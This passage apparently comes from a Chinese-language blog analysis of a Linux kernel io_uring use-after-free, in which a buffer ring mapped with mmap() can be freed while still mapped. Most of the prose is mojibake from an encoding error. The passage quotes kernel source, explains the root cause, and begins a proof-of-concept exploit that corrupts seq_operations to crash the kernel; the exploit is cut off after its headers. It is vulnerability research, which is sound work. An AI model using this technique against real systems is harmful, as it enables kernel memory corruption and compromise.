class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Flags for IORING_REGISTER_PBUF_RING.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * IOU_PBUF_RING_MMAP:If set, kernel will allocate the memory for the ring.</span><br><span class="hljs-comment"> *The application must not set a ring_addr in struct</span><br><span class="hljs-comment"> *io_uring_buf_reg, instead it must subsequently call</span><br><span class="hljs-comment"> *mmap(2) with the offset set as:</span><br><span class="hljs-comment"> *IORING_OFF_PBUF_RING | (bgid &lt;&lt; IORING_OFF_PBUF_SHIFT)</span><br><span class="hljs-comment"> *to get a virtual mapping for the ring.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>IOU_PBUF_RING_MMAP= <span class="hljs-number">1</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>è‹¥æœªè®¾ç½®è¯¥æ ‡å¿—ä½ï¼Œåˆ™æ„å‘³ç€ç”±ç”¨æˆ·æ€ç¨‹åºæä¾›å¯¹åº”çš„é¡µé¢ï¼Œæ­¤æ—¶å†…æ ¸ä¼šè°ƒç”¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_pin_pages">io_pin_pages()</a> å¹¶æœ€ç»ˆè°ƒç”¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/pin_user_pages">pin_user_pages()</a> å®Œæˆè¿™ä¸€æ“ä½œ</p></blockquote><p>å› ä¸ºæˆ‘ä»¬çš„æ¼æ´å‡ºç°åœ¨å’Œ <code>mmap()</code> ç›¸å…³çš„è·¯å¾„ä¸Šï¼Œå› æ­¤æˆ‘ä»¬ä¸»è¦å…³æ³¨è°ƒç”¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> è¿™ä¸€è·¯å¾„ï¼Œè¯¥æœ€ç»ˆä¼šè°ƒç”¨ <code>__get_free_pages()</code> åˆ†é…ç©ºé—²é¡µé¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">io_alloc_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring_buf_reg *reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> io_buffer_list *bl)</span><br>&#123;<br><span class="hljs-type">gfp_t</span> gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP;<br><span class="hljs-type">size_t</span> ring_size;<br><span class="hljs-type">void</span> *ptr;<br><br>ring_size = reg-&gt;ring_entries * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf_ring);<br>ptr = (<span class="hljs-type">void</span> *) __get_free_pages(gfp, get_order(ring_size));<br><span class="hljs-keyword">if</span> (!ptr)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>bl-&gt;buf_ring = ptr;<br>bl-&gt;is_mapped = <span class="hljs-number">1</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†é…çš„ç»“æ„å¤§æ¦‚é•¿è¿™ä¸ªæ ·å­ï¼š</p><p><img src="https://s2.loli.net/2025/03/13/nzrlJ62up7TomCy.png"></p><h3 id="II-æ³¨é”€ï¼šIORING-UNREGISTER-PBUF-RING"><a href="#II-æ³¨é”€ï¼šIORING-UNREGISTER-PBUF-RING" class="headerlink" title="II. æ³¨é”€ï¼šIORING_UNREGISTER_PBUF_RING"></a>II. æ³¨é”€ï¼šIORING_UNREGISTER_PBUF_RING</h3><p>æœ‰æ³¨å†Œå°±æœ‰æ³¨é”€ï¼Œæœ‰å†…å­˜åˆ†é…å°±æœ‰å†…å­˜é‡Šæ”¾ï¼Œæ³¨é”€ <code>PBUF_RING</code> å¯¹åº”çš„ opcode ä¸º <code>IORING_UNREGISTER_PBUF_RING</code> ï¼Œå†…æ ¸ä¼šè°ƒç”¨åˆ° <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_unregister_pbuf_ring">io_unregister_pbuf_ring()</a> è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_unregister_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">void</span> __user *arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">reg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>;</span><br><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="hljs-keyword">sizeof</span>(reg)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (reg.resv[<span class="hljs-number">0</span>] || reg.resv[<span class="hljs-number">1</span>] || reg.resv[<span class="hljs-number">2</span>])<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg.flags)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>bl = io_buffer_get_list(ctx, reg.bgid);<br><span class="hljs-keyword">if</span> (!bl)<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-keyword">if</span> (!bl-&gt;is_mapped)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>__io_remove_buffers(ctx, bl, <span class="hljs-number">-1U</span>);<br><span class="hljs-keyword">if</span> (bl-&gt;bgid &gt;= BGID_ARRAY) &#123;<br>xa_erase(&amp;ctx-&gt;io_bl_xa, bl-&gt;bgid);<br>kfree(bl);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸éš¾çœ‹å‡ºå…¶æ ¸å¿ƒé€»è¾‘ä¸ºï¼š</p><ul><li>é¦–å…ˆè°ƒç”¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_buffer_get_list">io_buffer_get_list()</a> è·å–å·²ç»å­˜åœ¨çš„ <code>io_buffer_list</code> ç»“æ„ä½“ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è¿”å›</li><li>æ¥ä¸‹æ¥è°ƒç”¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_remove_buffers">__io_remove_buffers()</a> é‡Šæ”¾  <code>io_buffer_list</code>  å½“ä¸­çš„é¡µé¢</li><li>æœ€åè°ƒç”¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/xa_erase">xa_erase()</a> ä»ä¸Šä¸‹æ–‡ä¸­ç§»é™¤è¯¥ <code>io_buffer_list</code> å¹¶é‡Šæ”¾</li></ul><p>åœ¨çœ‹ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_remove_buffers">__io_remove_buffers()</a> ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆå›å»çœ‹ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> ï¼Œæ³¨æ„åˆ° <code>io_buffer_list</code> è¿™äº›æˆå‘˜çš„èµ‹å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">io_alloc_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring_buf_reg *reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> io_buffer_list *bl)</span><br>&#123;<br><span class="hljs-comment">/* ... */</span><br>bl-&gt;is_mapped = <span class="hljs-number">1</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>å› æ­¤åœ¨  <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_remove_buffers">__io_remove_buffers()</a> å½“ä¸­ï¼Œæˆ‘ä»¬ä¼šè¿›å…¥ä¸‹é¢çš„è·¯å¾„å°†å‰é¢åˆ†é…çš„é¡µé¢é‡Šæ”¾æ‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __io_remove_buffers(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx,<br>       <span class="hljs-keyword">struct</span> io_buffer_list *bl, <span class="hljs-type">unsigned</span> nbufs)<br>&#123;<br><span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* shouldn&#x27;t happen */</span><br><span class="hljs-keyword">if</span> (!nbufs)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (bl-&gt;is_mapped) &#123;<br>i = bl-&gt;buf_ring-&gt;tail - bl-&gt;head;<br><span class="hljs-keyword">if</span> (bl-&gt;is_mmap) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br>page = virt_to_head_page(bl-&gt;buf_ring);<br><span class="hljs-keyword">if</span> (put_page_testzero(page))<br>free_compound_page(page);<br>bl-&gt;buf_ring = <span class="hljs-literal">NULL</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-comment">/* ... */</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>åœ¨åé¢çš„ç‰ˆæœ¬ä¸­é‡Šæ”¾é¡µé¢çš„é€»è¾‘ä¼šä»ä½¿ç”¨ <code>put_page_testzero()</code> æ¢æˆ <code>folio_put(virt_to_folio(bl-&gt;buf_ring));</code> ï¼Œå› æ­¤åœ¨ä¿®å¤è¯¥æ¼æ´çš„ commit å½“ä¸­ä½ çœ‹åˆ°çš„æ˜¯å»é™¤æ‰äº† <code>folio_put()</code> å‡½æ•°ï¼Œä½†æœ¬è´¨ä¸Šçš„é€»è¾‘æ˜¯ä¸€æ ·çš„</p></blockquote><h3 id="III-ä½¿ç”¨ï¼šio-uring-mmap"><a href="#III-ä½¿ç”¨ï¼šio-uring-mmap" class="headerlink" title="III. ä½¿ç”¨ï¼šio_uring_mmap"></a>III. ä½¿ç”¨ï¼šio_uring_mmap</h3><p>æˆ‘ä»¬å¦‚ä½•ä»ç”¨æˆ·ç©ºé—´è®¿é—®  <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> åˆ†é…çš„å†…å­˜ï¼Ÿå†…æ ¸é€šè¿‡ <code>mmap()</code>  ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿å¿«æ·çš„é€”å¾„ï¼Œå½“æˆ‘ä»¬å¯¹ä¸€ä¸ª <code>io_uring</code> çš„ fd ä½¿ç”¨ <code>mmap()</code> è¿›è¡Œæ˜ å°„æ—¶ï¼Œå†…æ ¸æœ€ç»ˆä¼šè°ƒç”¨åˆ° <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_uring_mmap">io_uring_mmap()</a> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __cold <span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-type">size_t</span> sz = vma-&gt;vm_end - vma-&gt;vm_start;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn;<br><span class="hljs-type">void</span> *ptr;<br><br>ptr = io_uring_validate_mmap_request(file, vma-&gt;vm_pgoff, sz);<br><span class="hljs-keyword">if</span> (IS_ERR(ptr))<br><span class="hljs-keyword">return</span> PTR_ERR(ptr);<br><br>pfn = virt_to_phys(ptr) &gt;&gt; PAGE_SHIFT;<br><span class="hljs-keyword">return</span> remap_pfn_range(vma, vma-&gt;vm_start, pfn, sz, vma-&gt;vm_page_prot);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">io_uring_fops</span> =</span> &#123;<br>.release= io_uring_release,<br>.mmap= io_uring_mmap,<br></code></pre></td></tr></table></figure><p>åœ¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_uring_validate_mmap_request">io_uring_validate_mmap_request()</a> å‡½æ•°ä¸­é¦–å…ˆä¼šæ ¹æ® <code>mmap()</code> çš„ <code>offset</code> å‚æ•°åˆ¤æ–­å…·ä½“æ“ä½œï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºå¯¹äº <code>io_uring</code> è€Œè¨€ <code>mmap()</code> çš„æœ€åä¸€ä¸ªå‚æ•°å¹¶éä¼ ç»Ÿçš„ç”¨æ¥è¡¨ç¤ºåç§»å€¼ï¼Œè€Œæ˜¯ä½¿ç”¨é«˜ä½æ•°æ®ä½œä¸º mask è¡¨ç¤ºä¸åŒç±»å‹ï¼Œä½ä½å­˜å‚¨å…·ä½“æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å’Œ <code>PBUF_RING</code> ç›¸å…³çš„åˆ†æ”¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">io_uring_validate_mmap_request</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">    <span class="hljs-type">loff_t</span> pgoff, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_ring_ctx</span> *<span class="hljs-title">ctx</span> =</span> file-&gt;private_data;<br><span class="hljs-type">loff_t</span> offset = pgoff &lt;&lt; PAGE_SHIFT;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr;<br><br><span class="hljs-comment">/* Don&#x27;t allow mmap if the ring was setup without it */</span><br><span class="hljs-keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><br><span class="hljs-keyword">switch</span> (offset &amp; IORING_OFF_MMAP_MASK) &#123;<br><span class="hljs-keyword">case</span> IORING_OFF_SQ_RING:<br><span class="hljs-keyword">case</span> IORING_OFF_CQ_RING:<br>ptr = ctx-&gt;rings;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> IORING_OFF_SQES:<br>ptr = ctx-&gt;sq_sqes;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> IORING_OFF_PBUF_RING: &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bgid;<br><br>bgid = (offset &amp; ~IORING_OFF_MMAP_MASK) &gt;&gt; IORING_OFF_PBUF_SHIFT;<br>mutex_lock(&amp;ctx-&gt;uring_lock);<br>ptr = io_pbuf_get_address(ctx, bgid);<br>mutex_unlock(&amp;ctx-&gt;uring_lock);<br><span class="hljs-keyword">if</span> (!ptr)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br>&#125;<br><br>page = virt_to_head_page(ptr);<br><span class="hljs-keyword">if</span> (sz &gt; page_size(page))<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_pbuf_get_address">io_pbuf_get_address</a> çš„é€»è¾‘å°±ç®€å•å¾ˆå¤šï¼Œä¸»è¦å°±æ˜¯å–å‡ºæˆ‘ä»¬å‰é¢åˆ†é…çš„ <code>buf_ring</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">io_pbuf_get_address</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bgid)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>;</span><br><br>bl = io_buffer_get_list(ctx, bgid);<br><span class="hljs-keyword">if</span> (!bl || !bl-&gt;is_mmap)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> bl-&gt;buf_ring;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>æˆ‘ä»¬å…¶å®ä¸éš¾çœ‹å‡ºæ¼æ´å‡ºç°åœ¨å¯¹å†…å­˜æ‰€æœ‰æƒçš„ä¸ä¸¥æ ¼ç®¡æ§ï¼Œå½“æˆ‘ä»¬å°† <code>bl-&gt;buf_ring</code> çš„å†…å­˜é€šè¿‡ <code>mmap()</code> æ˜ å°„å‡ºå»ä¹‹åï¼Œ <strong>å±…ç„¶ä»æ—§èƒ½å¤Ÿç›´æ¥é€šè¿‡ io_unregister_pbuf_ring å‡½æ•°å°†è¿™å—å†…å­˜ç»™é‡Šæ”¾æ‰</strong> ï¼Œç”±æ­¤æˆ‘ä»¬å…ˆè¿›è¡Œå†…å­˜åˆ†é…ã€å†è¿›è¡Œ <code>mmap()</code> ã€æœ€åå†é‡Šæ”¾è¿™å—å†…å­˜å°±ç›´æ¥æœ‰ä¸€ä¸ª UAF äº†ï¼š <strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡ mmap() çš„å†…å­˜åŒºåŸŸç›´æ¥è¯»å†™é‡Šæ”¾æ‰çš„å†…å†…å­˜é¡µ</strong> </p><p><img src="https://s2.loli.net/2025/03/14/3ovedsrfOby8KUw.png"></p><h2 id="Proof-Of-Concept"><a href="#Proof-Of-Concept" class="headerlink" title="Proof-Of-Concept"></a>Proof-Of-Concept</h2><p>è¿™é‡Œç¬”è€…ç»™å‡ºè‡ªå·±å†™çš„ POCï¼Œä¸»è¦å°±æ˜¯åˆ©ç”¨ UAF æ¼æ´åœ¨ <code>seq_file::seq_operations</code> é‡Œçå†™ä¸€é€šé€ æˆ kernel panicï¼š</p><blockquote><p>ä¸ºä»€ä¹ˆç”¨ liburing è€Œä¸æ˜¯è‡ªå·±æ‰‹æ“ raw syscallï¼Ÿå› ä¸ºğŸ‘´è¿˜æ²¡é‚£ä¹ˆé—²å¾—æ…Œ</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> IS_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PTR_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESSS_MSG(msg) <span class="hljs-string">&quot;\033[32m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg) <span 